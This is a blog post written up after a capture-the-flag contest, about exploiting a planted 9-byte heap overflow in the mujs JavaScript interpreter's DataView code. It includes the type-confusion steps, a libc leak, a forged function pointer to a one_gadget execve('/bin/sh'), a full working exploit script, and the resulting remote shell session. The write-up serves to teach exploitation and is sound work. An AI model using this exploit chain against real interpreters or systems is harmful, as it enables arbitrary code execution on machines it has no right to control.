+++
title = "mujs interpreter 9 byte heap overflow to code execution - mujs - pwn - SUSCTF 2022"
date = 2022-02-28
+++


# SUSCTF
I played [SUSCTF 2022](https://ctftime.org/event/1566) with team SU this weekend and we got first place! I've decided to write my first ever writeup today. I solved mujs, rubbish maker and tttree. I liked all of them. I'll write about them in the order of solves.
![SUSCTF 2022 results](results.png)


## mujs - pwn
### Statement
We are given an [attachment](./attachment.zip) and a statement:
```
dd0a0972b4428771e6a3887da2210c7c9dd40f9c  
nc 124.71.182.21 9999
```
We are given a source code of [`mujs`](https://github.com/ccxvii/mujs) which is supposedly a js interpreter for embedded devices. It's not terribly big. We are also given compiled binary and libc which are running on remote server.

The hash in the statement tells us that given source was modified from this specific commit of `mujs`: [dd0a0972](https://github.com/ccxvii/mujs/tree/dd0a0972b4428771e6a3887da2210c7c9dd40f9c). This commit is pretty new and no bugs seem to be fixed since then.

I diffed the two source codes. Main difference that we see is: 
- Some builtins being disabled in main.c; 
- dataview.c being added which is a simple implementation of [DataView](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/DataView).

Let's try connecting to remote:
```sh
$ nc 124.71.182.21 9999
./tmp/13751.js
Please give your exp.js here, end with '< EOF >':
print("WOW")

< EOF >
last_size: 0
./mujs ./tmp/13751.js
WOW
```
This tells us that server reads our provided js file and runs it as :
```sh
./mujs file.js
```

### Finding bug
I fired up [afl++](https://github.com/AFLplusplus/AFLplusplus) right away so it would fuzz while I was working but it found no results. I also searched for [mujs CVE's](https://www.cvedetails.com/product/34934/Artifex-Mujs.html?vendor_id=10846) and there were no code execution bugs since 2017 so I guessed the vulnerability must be in the modified code.

First we need to understand what this added DataView does. Normal usage of DataView looks like this:
```js
x = new DataView(10)
print(x.getUint8(0))
print(x.getUint8(9))
print(x.getUint8(12)) // should not work
print(x.setUint32(0, 10))
...
```
Okay.

After some time auditing I found this unusable oob write:
```c
static void Dv_setUint32(js_State *J)
{
	js_Object *self = js_toobject(J, 0);
	if (self->type != JS_CDATAVIEW) js_typeerror(J, "not an DataView");
	size_t index = js_tonumber(J, 1);
	uint32_t value = js_tonumber(J, 2);

	if (index+3 < self->u.dataview.length) {
		*(uint32_t*)&self->u.dataview.data[index] = value;
	} else {
		js_error(J, "out of bounds access on DataView");
	}
}
```
If we do `x.setUint32(-3, 0)` then index is -3(but unsigned) and so `index+3 < length` check passes and we overwrite 3 bytes before the data buffer of DataView. This could be exploitable if data buffer was freed but it's freed nowhere... It basically automatically leaks `dataview.data` so no luck here.

But then I found the glaringly obvious bug:
```c
static void Dv_setUint8(js_State *J)
{
	js_Object *self = js_toobject(J, 0);
	if (self->type != JS_CDATAVIEW) js_typeerror(J, "not an DataView");
	size_t index = js_tonumber(J, 1);
	uint8_t value = js_tonumber(J, 2);
	if (index < self->u.dataview.length+0x9) { // <---- here
		self->u.dataview.data[index] = value;
	} else {
		js_error(J, "out of bounds access on DataView");
	}
}
```
Here authors just allowed us 9 byte overflow and this is what we're going to use for our exploit.


### Leveraging the bug

#### Type confusion

Here my teammate had an I idea to do type confusion on js_Object:
```c
struct js_Object
{
	enum js_Class type;
	int extensible;
	js_Property *properties;
	...
}
```
Since type is 1 byte and we have 9 byte overflow it seems too perfect(8 bytes for malloc metadata + 1 for type) not to be true. And another teammate came up with poc of type confusion:
```js
b = DataView(0x68);
a = DataView(0x48);
b = DataView(0x48);
c = DataView(0x48);


print(c)
b.setUint8(0x48+8, 8); // change type of c to something
print(c)
```
Which prints:
```
[object DataView]
[object String]
```
Nice!


#### Overwriting DataView's length


js_Object uses C unions so different types can use same memory. Because C unions basically alias the same memory my idea was to somehow change DataView length using a field which is aliased to the same memory and make it bigger so we would have heap oob r/w.

Here's what js_Object looks like:
```c
struct js_Object
{
	enum js_Class type;
	int extensible;
	js_Property *properties;
	int count; 
	js_Object *prototype;
	union {
		int boolean;
		double number;
		struct {
			const char *string;
			int length;
		} s;
		struct {
			int length;
		} a;
		struct {
			js_Function *function;
			js_Environment *scope;
		} f;
		struct {
			const char *name;
			js_CFunction function;
			js_CFunction constructor;
			int length;
			void *data;
			js_Finalize finalize;
		} c;
		js_Regexp r;
		struct {
			js_Object *target;
			js_Iterator *head;
		} iter;
		struct {
			const char *tag;
			void *data;
			js_HasProperty has;
			js_Put put;
			js_Delete delete;
			js_Finalize finalize;
		} user;
		struct {
		    uint32_t length;
		    uint8_t* data;
		} dataview;
	} u;
// ...
};
```
Here for example `js_Object.u.dataview.length` is stored at the same offset as `js_Object.u.number` and `js_Object.u.c.name`. 

So for overwriting `u.number` I found this: 
```c
static void js_setdate(js_State *J, int idx, double t)
{
	js_Object *self = js_toobject(J, idx);
	if (self->type != JS_CDATE)
		js_typeerror(J, "not a date");
	self->u.number = TimeClip(t);
	js_pushnumber(J, self->u.number);
}
// ... called from here
static void Dp_setTime(js_State *J)
{
	js_setdate(J, 0, js_tonumber(J, 1));
}
```
Let's try!

`JS_CDATE` value is 10 so we need to set `type` to 10 get `Date` object.
```js
b = DataView(0x68);
a = DataView(0x48);
b = DataView(0x48);
c = DataView(0x48);


print(c)
b.setUint8(0x48+8, 10); // set type of c to Date
print(c)
c.setTime(0)
```
Result:
```
[object DataView]
[object Date]
TypeError: undefined is not callable
        at tconf.js:10
```
Hmm, type confusion worked but we can't call setTime? I was confused by this for some time but then I realized prototype of js object is set when it is first created so when we change type the prototype still stays the same. For those who don't know what prototype is it's basically what defines which methods exists on object.

So this is where my understanding of **cursed** js's `this` helped me: 
We can still call `setTime` using js's `bind`:
```js
Date.prototype.setTime.bind(c)(12)
```
And it works!
```js
b = DataView(0x68);
a = DataView(0x48);
b = DataView(0x48);
c = DataView(0x48);


print(c)
b.setUint8(0x48+8, 10); // set type of c to Date
print(c)
Date.prototype.setTime.bind(c)(1.09522e+12)

b.setUint8(0x48+8, 16); // type of c back to DataView
print(c.getLength())
```
Viola:
```
[object DataView]
[object Date]
1587544064
```
Now you might think overwriting `u.number` which is `double` and is 8 bytes would overwrite `u.dataview.data`'s first 4 bytes since `u.dataview.length` is 4 bytes. But padding saved us here so `data` pointer is unaffected as well. 

### Using heap OOB r/w for code execution

So this part is mostly exploring heap and finding out what object lie on it. But I can also control it as well. So I allocated two DataView's after `c` which I can find offsets to. [We know](https://ctf-wiki.mahaloz.re/pwn/linux/glibc-heap/heap_overview/) that allocating more than 128kb using `malloc` causes it to be `mmap`'d and knowing the address of that chunk leaks libc's base.

So I used that for leaking libc base address and then forged a `JS_CCFUNCTION` type object which has a `u.c.function` which we can simply call:

```c
void js_call(js_State *J, int n)
{
// ...
			jsR_callfunction(J, n, obj->u.f.function, obj->u.f.scope);
// ...
}
```

It's basically a C function pointer we can call directly from js.

So now we just use amazing [one_gadget](https://github.com/david942j/one_gadget):
```bash
$ one_gadget libc.so.6
0xe6c7e execve("/bin/sh", r15, r12)
constraints:
  [r15] == NULL || r15 == NULL
  [r12] == NULL || r12 == NULL

0xe6c81 execve("/bin/sh", r15, rdx)
constraints:
  [r15] == NULL || r15 == NULL
  [rdx] == NULL || rdx == NULL

0xe6c84 execve("/bin/sh", rsi, rdx)
constraints:
  [rsi] == NULL || rsi == NULL
  [rdx] == NULL || rdx == NULL
```
And third gadget got worked!

```bash
$ nc 124.71.182.21 9999
./tmp/18759.js
Please give your exp.js here, end with '< EOF >':
b = DataView(0x68);
.... rest of exploit here
< EOF >
last_size: 0
./mujs ./tmp/18759.js
ls
bin
dev
flag
io
lib
lib32
lib64
libx32
mujs
tmp
cat flag
SUSCTF{***********************}
```

### Final exploit
```js
b = DataView(0x68);
a = DataView(0x48);
b = DataView(0x48);
c = DataView(0x48);
e = DataView(0x48);
f = DataView(0x1000 * 0x1000);

b.setUint8(0x48+8, 10); // set c type to Date
Date.prototype.setTime.bind(c)(1.09522e+12) // write random big number to u.number/u.length
b.setUint8(0x48+8, 16); // set c type back to DataView


sh32 = 4294967296 // 1<<32
libb_addr_off = 472
libc_leak = c.getUint32(libb_addr_off) + (c.getUint32(libb_addr_off+4)*sh32)

libc_off = 0x7ffff7c31000 - 0x7ffff6bfe010 // got this from gdb
libc_base = libc_leak + libc_off
print('libc base:', libc_base.toString(16))

one_gag = libc_base + 0xe6c84
print('onegadget:', one_gag.toString(16))

e_obj_off = 192
c.setUint8(160, 4) // this sets type to JS_CCFUNCTION

// set lower 4 bytes of js_CFunction function
c.setUint32(e_obj_off+8, one_gag&0xffffffff) 

// set upper 4 bytes of js_CFunction function
c.setUint32(e_obj_off+8+4, Math.floor(one_gag/sh32)&0xffffffff) 
e() // e is now a function so we can call it 
```

I'm speaking with no experience here but this is basic idea of how heap overflow bugs are exploited in big projects like V8 but there's much more stuff going on there so it's way harder to get determinism.

Thanks for the reading til the end! Let's hope I'll write more writeups :D
